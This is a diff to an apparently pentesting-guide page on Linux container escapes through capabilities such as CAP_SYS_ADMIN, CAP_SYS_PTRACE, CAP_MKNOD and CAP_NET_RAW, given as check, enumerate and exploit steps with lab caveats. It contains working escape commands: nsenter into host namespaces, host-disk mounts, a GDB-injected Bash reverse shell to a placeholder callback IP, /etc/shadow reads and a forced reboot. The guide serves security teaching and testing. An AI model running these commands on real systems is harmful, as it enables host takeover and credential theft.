@@ -49,15 +49,18 @@ These small experiments help show that a runtime is not simply toggling a boolea
 
 ## High-Risk Capabilities
 
-Although many capabilities can matter depending on the target, a few are repeatedly relevant in container escape analysis.
+Capabilities become escape primitives only when their operation reaches a **host-governed resource**. The recurring high-risk combinations are:
 
-**`CAP_SYS_ADMIN`** is the one defenders should treat with the most suspicion. It is often described as "the new root" because it unlocks an enormous amount of functionality, including mount-related operations, namespace-sensitive behavior, and many kernel paths that should never be casually exposed to containers. If a container has `CAP_SYS_ADMIN`, weak seccomp, and no strong MAC confinement, many classic breakout paths become much more realistic.
+- **`CAP_SYS_ADMIN`** plus a host PID, block device, or writable kernel-control path. Joining a target mount namespace additionally requires `CAP_SYS_CHROOT`; mounting a block-based filesystem requires `CAP_SYS_ADMIN` in the initial user namespace.
+- **`CAP_SYS_PTRACE`** plus host PID visibility and an attachable host process. `CAP_SYS_ADMIN` is not required for ptrace injection.
+- **`CAP_DAC_OVERRIDE` or `CAP_DAC_READ_SEARCH`** plus a reachable host filesystem. These capabilities bypass different DAC checks but do not create a host filesystem view.
+- **`CAP_SYS_MODULE`** in the initial user namespace plus an accepted, kernel-compatible module. Ordinary Linux containers share the node kernel; VM or userspace-kernel runtimes change that boundary.
+- **`CAP_MKNOD`** in the initial user namespace plus a real host device that the device cgroup already permits. Creating a node does not bypass the device cgroup.
+- **`CAP_SYS_RAWIO`** plus an exposed and usable memory, I/O-port, PCI, or device-control interface.
+- **`CAP_SYS_BOOT`** plus the initial PID namespace for a host reboot, or a usable and permitted kexec path for kernel replacement.
+- **`CAP_NET_ADMIN`** in the host network namespace for direct node network-state control. **`CAP_NET_RAW`** can participate in a protocol-specific escape, but raw sockets alone are not a node shell.
 
-**`CAP_SYS_PTRACE`** matters when process visibility exists, especially if the PID namespace is shared with the host or with interesting neighboring workloads. It can turn visibility into tampering.
-
-**`CAP_NET_ADMIN`** and **`CAP_NET_RAW`** matter in network-focused environments. On an isolated bridge network they may already be risky; on a shared host network namespace they are much worse because the workload may be able to reconfigure host networking, sniff, spoof, or interfere with local traffic flows.
-
-**`CAP_SYS_MODULE`** is usually catastrophic in a rootful environment because loading kernel modules is effectively host-kernel control. It should almost never appear in a general-purpose container workload.
+`CAP_SYS_CHROOT` is deliberately not listed as a standalone escape capability. It can be required by mount-namespace `setns()` and can make an already accessible host tree easier to use, but `chroot()` alone neither exposes that tree nor grants new filesystem permissions. Likewise, `CAP_BPF` and `CAP_PERFMON` expose powerful telemetry and kernel attack surface, but absent a separate kernel flaw their ordinary operations are not generic container escapes.
 
 ## Runtime Usage
 
@@ -73,93 +76,319 @@ It is also common to see administrators believe that because a workload is not f
 
 ## Abuse
 
-The first practical step is to enumerate the effective capability set and immediately test the capability-specific actions that would matter for escape or host information access:
+Start by recording the effective sets, user-namespace mapping, seccomp state, namespaces, mounts, and devices. A capability name without this context does not prove an escape:
 
 ```bash
 capsh --print
-grep '^Cap' /proc/self/status
+grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
+cat /proc/self/uid_map /proc/self/gid_map
+ls -l /proc/self/ns
+findmnt
 ```
 
-If `CAP_SYS_ADMIN` is present, test mount-based abuse and host filesystem access first, because this is one of the most common breakout enablers:
+### `CAP_SYS_ADMIN`: namespaces and block devices
+
+With host PID visibility, `CAP_SYS_ADMIN` can enter host namespaces. The mount-namespace operation also needs `CAP_SYS_CHROOT` in the caller's user namespace.
+
+**Check the capability and confinement:**
 
 ```bash
-mkdir -p /tmp/m
-mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
-mount | head
-find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
+capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
+grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
+cat /proc/self/uid_map /proc/self/gid_map
 ```
 
-If `CAP_SYS_PTRACE` is present and the container can see interesting processes, verify whether the capability can be turned into process inspection:
+**Enumerate the target:** confirm host PID sharing from the container/Pod configuration or an unmistakable host process list, then inspect the target namespaces. A local PID 1 exists in private PID namespaces too, so its presence alone does not prove host PID sharing.
 
 ```bash
-capsh --print | grep cap_sys_ptrace
-ps -ef | head
-for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
+ps -eo pid,user,comm,args
+target_pid=1
+tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
+ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
 ```
 
-If `CAP_NET_ADMIN` or `CAP_NET_RAW` is present, test whether the workload can manipulate the visible network stack or at least gather useful network intelligence:
+**Exploit the namespace path:**
 
 ```bash
-capsh --print | grep -E 'cap_net_admin|cap_net_raw'
-ip addr
-ip route
-iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
+nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
+id
+findmnt /
 ```
 
-When a capability test succeeds, combine it with the namespace situation. A capability that looks merely risky in an isolated namespace can become an escape or host-recon primitive immediately when the container also shares host PID, host network, or host mounts.
+The capability checks must succeed in the user namespaces that own the targets. `--pid=host` or Kubernetes `hostPID: true` supplies visibility; it does not supply the capabilities.
 
-### Full Example: `CAP_SYS_ADMIN` + Host Mount = Host Escape
-
-If the container has `CAP_SYS_ADMIN` and a writable bind mount of the host filesystem such as `/host`, the escape path is often straightforward:
+For the alternative block-device path, **enumerate** the candidates, then **exploit** the accessible filesystem by mounting the validated candidate read-only first:
 
 ```bash
-capsh --print | grep cap_sys_admin
-mount | grep ' /host '
+lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
+node_root_device=/dev/vda1  # Replace with the validated candidate.
+mkdir -p /mnt/hostdisk
+mount -o ro "${node_root_device}" /mnt/hostdisk
+cat /mnt/hostdisk/etc/hostname
+umount /mnt/hostdisk
+```
+
+The device node must exist, the device cgroup must allow it, and block-filesystem mounts require `CAP_SYS_ADMIN` in the initial user namespace. A host root already bind-mounted at `/host` is host access **without** `CAP_SYS_ADMIN`; `chroot /host` is only a convenience and separately requires `CAP_SYS_CHROOT`.
+
+### Reachable host root: direct filesystem execution
+
+If the host root is already mounted at `/host`, first confirm the mount and then use the existing access directly. This path does not depend on `CAP_SYS_ADMIN`:
+
+```bash
+findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
 ls -la /host
 chroot /host /bin/bash
 ```
 
-If `chroot` succeeds, commands now execute in the host root filesystem context:
-
-```bash
-id
-hostname
-cat /etc/shadow | head
-```
-
-If `chroot` is unavailable, the same result can often be achieved by calling the binary through the mounted tree:
+If `chroot()` is unavailable but the host binary is compatible with the container's architecture and loader, it can often be called through the mounted tree instead:
 
 ```bash
 /host/bin/bash -p
 export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
 ```
 
-### Full Example: `CAP_SYS_ADMIN` + Device Access
+Direct reads and writes under `/host` are already host-filesystem compromise. `chroot()` or executing a host binary only makes that access more convenient; neither operation creates the host mount or bypasses a read-only mount or MAC policy.
 
-If a block device from the host is exposed, `CAP_SYS_ADMIN` can turn it into direct host filesystem access:
+### `CAP_SYS_PTRACE`: host-process injection
+
+With host PID visibility and `CAP_SYS_PTRACE` in the target's user namespace, GDB can make an approved host process call `system()`. `CAP_SYS_ADMIN` is not required.
+
+**Check the capability and attachment controls:**
 
 ```bash
-ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
-mkdir -p /mnt/hostdisk
-mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
-ls -la /mnt/hostdisk
-chroot /mnt/hostdisk /bin/bash 2>/dev/null
+capsh --print | grep cap_sys_ptrace
+grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
+cat /proc/self/uid_map
+cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
 ```
 
-### Full Example: `CAP_NET_ADMIN` + Host Networking
-
-This combination does not always produce host root directly, but it can fully reconfigure the host network stack:
+**Enumerate and select a disposable target:** confirm host PID sharing from configuration or an unmistakable node process list; never select PID 1 or a critical daemon.
 
 ```bash
-capsh --print | grep cap_net_admin
-ip addr
+ps -eo pid,user,comm,args
+target_pid=<approved-lab-process-pid>
+readlink "/proc/${target_pid}/exe"
+grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
+  "/proc/${target_pid}/status"
+```
+
+**Exploit the selected process:**
+
+```bash
+# On a reachable assessment system:
+nc -lvnp 4444
+
+# In the container:
+callback_ip=192.0.2.10
+callback_port=4444
+gdb -q -nx -batch -p "${target_pid}" \
+  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
+  -ex detach
+```
+
+The target must be attachable and have a usable `system()` symbol and Bash payload path. Yama, non-dumpable state, seccomp, user namespaces, and MAC policy can block the chain. GDB stops the target while attached, so use only a disposable lab process.
+
+### `CAP_DAC_OVERRIDE` and `CAP_DAC_READ_SEARCH`: protected host files
+
+These capabilities do not expose the host filesystem. If `/host` is already a host mount, `CAP_DAC_READ_SEARCH` can bypass read/search DAC checks and `CAP_DAC_OVERRIDE` can additionally bypass ordinary write checks:
+
+**Check the capabilities:**
+
+```bash
+capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
+grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
+```
+
+**Enumerate the exposed host filesystem and target permissions:**
+
+```bash
+findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
+stat -c 'owner=%u:%g mode=%A path=%n' \
+  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
+find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
+```
+
+**Exercise the read and write bypasses** in a disposable lab:
+
+```bash
+head -n 1 /host/etc/shadow
+printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
+rm /host/root/ht-dac-proof
+```
+
+A read-only mount and LSM rules still apply. `CAP_DAC_READ_SEARCH` also authorizes `open_by_handle_at()`, but a breakout such as Shocker additionally needs a mount file descriptor for the same underlying filesystem, valid or discoverable handles, a compatible filesystem/storage layout, and no runtime or LSM block. It does not provide arbitrary access to every filesystem outside the mount namespace.
+
+### `CAP_SYS_MODULE`: shared-kernel execution
+
+In an ordinary Linux container, an accepted module runs in the shared host kernel.
+
+**Check the capability and user-namespace scope:**
+
+```bash
+capsh --print | grep cap_sys_module
+grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
+cat /proc/self/uid_map
+```
+
+**Enumerate module-loading prerequisites:**
+
+```bash
+uname -r
+cat /proc/sys/kernel/modules_disabled
+cat /sys/kernel/security/lockdown 2>/dev/null
+grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
+  "/boot/config-$(uname -r)" 2>/dev/null
+modinfo /lab/ht-proof.ko
+```
+
+**Exploit only with a compatible, pre-reviewed proof module on a disposable node:**
+
+```bash
+insmod /lab/ht-proof.ko
+grep '^ht_proof ' /proc/modules
+rmmod ht_proof
+```
+
+The capability must be effective in the initial user namespace. Kernel version and configuration, module signatures, lockdown, seccomp, and LSM policy must permit the load. Kata, gVisor, Hyper-V isolation, and similar runtimes change which kernel boundary the workload reaches.
+
+### `CAP_MKNOD`: create a permitted device handle
+
+`CAP_MKNOD` creates a device node but does not bypass the device cgroup. Device creation is not namespaced, so the capability must be effective in the initial user namespace.
+
+**Check the capability and user-namespace scope:**
+
+```bash
+capsh --print | grep cap_mknod
+grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
+cat /proc/self/uid_map
+```
+
+**Enumerate the real devices, their major/minor numbers, and any visible cgroup-v1 allowlist:**
+
+```bash
+lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
+for device_file in /sys/class/block/*/dev; do
+  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
+done
+cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
+```
+
+**Exploit a validated ext-family candidate read-only:**
+
+```bash
+node_block_name=vda1                       # Replace with the validated candidate.
+device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
+device_major=${device_numbers%:*}
+device_minor=${device_numbers#*:}
+mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
+debugfs -R 'cat /etc/hostname' /dev/ht-node-root
+rm /dev/ht-node-root
+```
+
+Other filesystems need a matching read-only tool; mounting the device additionally needs `CAP_SYS_ADMIN`. `Operation not permitted` when opening the created node usually indicates the device cgroup still blocks it. Under cgroup v2, device access is commonly enforced with BPF and no `devices.list` file exists, so a successful open is the decisive test.
+
+### `CAP_SYS_RAWIO`: exposed raw-I/O interface
+
+There is no portable generic payload: valid addresses and effects depend on hardware and kernel configuration.
+
+**Check the capability and user-namespace scope:**
+
+```bash
+capsh --print | grep cap_sys_rawio
+grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
+cat /proc/self/uid_map
+```
+
+**Enumerate exposed raw interfaces, hardware, and drivers:**
+
+```bash
+ls -l /dev/mem /dev/port 2>/dev/null
+lspci -nnk 2>/dev/null
+find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
+```
+
+**Exploit only with an approved proof for the identified device and address range.** If `/dev/mem` is the lab-approved interface, this template proves node-memory disclosure without printing its contents:
+
+```bash
+approved_physical_address=<lab-provided-decimal-address>
+approved_byte_count=<lab-provided-size>
+dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
+  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
+wc -c /tmp/ht-rawio-proof.bin
+sha256sum /tmp/ht-rawio-proof.bin
+rm /tmp/ht-rawio-proof.bin
+```
+
+The address must come from the lab's hardware map because reading some MMIO regions can have side effects. A generic memory-write command would be misleading and unsafe: the same address can be harmless on one machine and control hardware or kernel memory on another. Device cgroups, filesystem permissions, strict `/dev/mem`, kernel lockdown, virtualization, and LSM policy commonly prevent useful access.
+
+### `CAP_SYS_BOOT`: namespace reboot or kernel replacement
+
+In a private PID namespace, `reboot()` terminates that namespace's init process rather than rebooting the host. Host reboot impact therefore needs the initial PID namespace, normally through host PID sharing. A kexec path also needs a compatible kernel image and permissive lockdown/signature policy:
+
+**Check the capability:**
+
+```bash
+capsh --print | grep cap_sys_boot
+grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
+cat /proc/self/uid_map
+```
+
+**Enumerate the PID-namespace and kexec prerequisites:** confirm host PID sharing from the workload configuration because a PID namespace link alone does not reveal whether it is the node's initial namespace.
+
+```bash
+ps -p 1 -o pid,user,comm,args
+readlink /proc/self/ns/pid
+command -v kexec 2>/dev/null
+cat /sys/kernel/security/lockdown 2>/dev/null
+```
+
+**Exploit only when rebooting a disposable lab node is the explicit exercise:**
+
+```bash
+sync
+reboot -f
+```
+
+Do not issue that command or load a kernel on a shared node merely to prove the capability. In a private PID namespace it terminates only that namespace's init process and does not demonstrate host impact.
+
+### `CAP_NET_ADMIN` and `CAP_NET_RAW`: host network paths
+
+`CAP_NET_ADMIN` affects only the current network namespace.
+
+**Check the capabilities and confinement:**
+
+```bash
+capsh --print | grep -E 'cap_net_admin|cap_net_raw'
+grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
+```
+
+**Enumerate the current network and confirm host networking from the workload configuration:**
+
+```bash
+readlink /proc/self/ns/net
+ip -brief address
 ip route
-iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
-ip link set lo down 2>/dev/null
-iptables -F 2>/dev/null
+nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
 ```
 
-That can enable denial of service, traffic interception, or access to services that were previously filtered.
+**Exercise `CAP_NET_ADMIN` reversibly:** with host networking, the temporary interface is a node interface.
+
+```bash
+ip link add ht-net-admin-proof type dummy
+ip addr add 192.0.2.1/32 dev ht-net-admin-proof
+ip link set ht-net-admin-proof up
+ip -brief addr show ht-net-admin-proof
+ip link delete ht-net-admin-proof
+```
+
+`CAP_NET_RAW` permits RAW and PACKET sockets but is not a generic host shell. To **enumerate** the documented GCE chain, check the metadata route and capture whether plaintext guest-agent traffic is observable:
+
+```bash
+ip route get 169.254.169.254
+tcpdump -ni any -c 20 'host 169.254.169.254'
+```
+
+If the matching prerequisites exist, **exploit** the environment-specific chain as documented in [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): capture the request and sequence state, inject the forged metadata response containing an SSH key, then validate host access. The chain required root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata traffic, and a raceable guest-agent request; modern transport or agent behavior can break it.
 
 ## Checks
 
